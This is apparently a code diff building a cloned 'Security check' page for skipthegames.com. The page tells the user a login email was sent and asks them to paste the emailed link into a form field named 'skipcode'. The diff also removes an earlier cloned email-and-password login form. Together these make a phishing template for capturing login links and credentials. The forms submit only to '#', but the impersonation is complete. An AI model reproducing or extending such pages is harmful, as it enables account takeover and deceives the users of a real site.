@@ -1,14 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Document</title>
-</head>
-<body>
-	<h1>secutiy</h1>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400..700;1,400..700&display=swap");
+      body {
+        font-family: "Arimo", sans-serif;
+      }
+      .custom-shadow-top {
+        box-shadow: 0px -4px 14px 0px rgba(27, 25, 25, 0.315);
+      }
+      .custom-shadow-bottom {
+        box-shadow: 0px 4px 14px 0px rgba(27, 25, 25, 0.315);
+      }
+    </style>
+  </head>
+  <body>
+    <!--first navbar -->
+    <div
+      class="pt-1 pb-2 px-4 lg:px-[85px] text-[13px] text-center bg-[#5F5F5F] text-white lg:leading-[28px]"
+    >
+      We use cookies, just to track visits to our website, we store no personal
+      details.
+      <span
+        class="mt-2 lg:mt-0 px-3 py-2 block lg:inline rounded-sm bg-[#7daf3b] hover:bg-black transition-colors duration-300"
+        >ACCEPT COOKIES</span
+      >
+      <span class="mt-4 lg:mt-0 block lg:inline underline hover:no-underline"
+        >What are cookies?</span
+      >
+    </div>
+    <!-- second navbar -->
+
+    <div
+      class="pt-[10px] pb-[27px] flex flex-col items-center lg:px-[27px] xl:px-[190px] custom-shadow-bottom mx-auto lg:flex-row lg:justify-between"
+    >
+      <div class="lg:self-start mt-[3px] lg:mt-0">
+        <img
+          alt="logo"
+          src="./images/logo.png"
+          width="255"
+          height="39"
+          decoding="async"
+          data-nimg="1"
+          style="color: transparent"
+        />
+      </div>
+      <p
+        class="text-[#777777] mt-[8px] lg:mt-[20px] text-custom-gray text-lg text-center font-medium px-[75px] lg:px-0"
+      >
+        Skip the
+        <span class="block lg:inline-block">games.Get satisfaction.</span>
+      </p>
+      <div class="lg:self-end mt-2 lg:mt-0 text-end text-[14.4px]">
+        <p class="text-custom-rose underline font-bold">robi@robi.com</p>
+        <div class="">
+          <span
+            class="text-[#aaaaaa] hover:text-custom-rose hover:underline cursor-pointer"
+            >go to your account</span
+          ><span class="ml-1 text-custom-rose hover:underline cursor-pointer"
+            >| log out</span
+          >
+        </div>
+      </div>
+    </div>
+
+    <!--security check shadow div-->
+    <div
+      class="lg:px-[27px] xl:px-[190px] py-[18px] lg:py-[22px] px-4 flex items-center gap-2 drop-shadow-sm text-[11px]"
+    >
+      <p>SKIPTHEGAMES.COM</p>
+      <span class="text-[#2ba6cb]">»</span>
+      <p class="text-[#2ba6cb]">SECURITY CHECK</p>
+    </div>
+
+
+
+	<!-- security details and footer -->
+    <div class="custom-shadow-top">
+		<!-- security details -->
+		<div class=" lg:px-[27px] xl:px-[190px] px-4 pt-[14px] lg:pt-[18px] py-[38px] text-custom-gray2">
+			<h1 class="text-[27px]">Security check</h1>
+			<div class="mt-[8px] space-y-[22px]">
+			  <p class="">
+				We have upgraded our security to protect all users against account
+				takeovers and hacking.
+			  </p>
+			  <p class="">
+				To complete this login, an Email has been sent to your address
+				robi@robi.com.
+				<span class="text-xs text-custom- underline"
+				  >I don't have access to this email account</span
+				>
+			  </p>
+			  <p class="">Please enter this email link:</p>
+			  <div class="">
+				<form action="#" class="flex gap-5">
+				  <div class="">
+					<input
+					  name="skipcode"
+					  class="lg:w-[470px] text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
+					  placeholder="Please copy and then paste this link into a from (a bar) on a web page:"
+					  type="text"
+					  required=""
+					  value=""
+					/>
+				  </div>
+				  <button
+					type="submit"
+					class="bg-[#2ba6cb] hover:bg-[#258cac]  px-[25px] py-[12px] text-white text-sm transition duration-300 rounded"
+				  >
+					Submit
+				  </button>
+				</form>
+			  </div>
+			  <p class="">The email you received is good for 30 minutes.</p>
+			  <p class="">
+				It may take the code up to 10 minutes to arrive. Make sure to check
+				your Spam/Junk/Trash folder.
+			  </p>
+			  <div class="flex gap-9 text-custom-rose">
+				<p class="cursor-pointer hover:text-custom-rose2 underline">
+				  Resend the code
+				</p>
+				<p class="cursor-pointer hover:text-custom-rose2 underline">
+				  I don't have access to this email account
+				</p>
+			  </div>
+			</div>
+		  </div>
+
+		  <hr class="lg:mx-[27px] xl:mx-[190px] mx-4">
+		   <!-- footer -->
+		   <div class="" >
+			  <div
+				class="py-[20px] flex lg:justify-between text-custom-gray  lg:px-[27px] px-4 xl:px-[190px]"
+			  >
+				<div class="">
+				  <p class="cursor-pointer text-[#777777] hover:text-[#383434]">
+					©skipthegames.com
+				  </p>
+				</div>
+				<div class="flex flex-wrap gap-2 lg:gap-[22px]">
+				  <div class="first:text-custom-gray text-custom-cyan">
+					<p class="cursor-pointer text-[#777777] hover:text-[#383434]">Home</p>
+				  </div>
+				  <div class="first:text-custom-gray text-custom-cyan">
+					<p class="cursor-pointer text-[#2ba6cb] hover:text-[#383434]">Contact</p>
+				  </div>
+				  <div class="first:text-custom-gray text-custom-cyan">
+					<p class="cursor-pointer text-[#2ba6cb] hover:text-[#383434]">About</p>
+				  </div>
+				  <div class="first:text-custom-gray text-custom-cyan">
+					<p class="cursor-pointer text-[#2ba6cb] hover:text-[#383434]">Privacy</p>
+				  </div>
+				  <div class="first:text-custom-gray text-custom-cyan">
+					<p class="cursor-pointer text-[#2ba6cb] hover:text-[#383434]">Terms</p>
+				  </div>
+				  <div class="first:text-custom-gray text-custom-cyan">
+					<p class="cursor-pointer text-[#2ba6cb] hover:text-[#383434]">Escort Info</p>
+				  </div>
+				</div>
+			  </div>
+			</div>
+	</div>
+  </body>
 </html>
-
-
-<div class="pt-[14px] lg:pt-[18px] py-[38px] grid grid-cols-1 lg:grid-cols-2 gap-5 lg:gap-[150px]"><div class=""><h3 class="text-[22px] lg:text-[27px] text-custom-gray2">Log in to your account</h3><div class="mt-2"><form action="#" class="space-y-5"><input name="email" class="w-full text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300" placeholder="Your email" type="email" required="" value="fdsf"><input name="password" class="w-full text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300" placeholder="Password" type="password" autocomplete="on" required="" value="fdsf"><button type="submit" class="w-full bg-custom-cyan hover:bg-custom-cyan2 py-[14px] text-white transition duration-300 rounded">Log in</button></form></div><p class="mt-5 text-[9px] text-custom-gray2 font-semibold">By clicking "Log in", you accept<span class="text-custom-cyan hover:text-custom-cyan2 cursor-pointer"> <!-- -->Skipthegames.com's Terms and Conditions of Use</span></p><p class="text-sm text-custom-rose underline cursor-pointer">Forgot your password?</p></div><div class="lg:ml-[120px]"><h3 class="text-[22px] lg:text-[27px] text-custom-gray2">First time here?</h3><p class="mt-[14px] text-custom-rose underline cursor-pointer">Post your first ad</p></div></div>
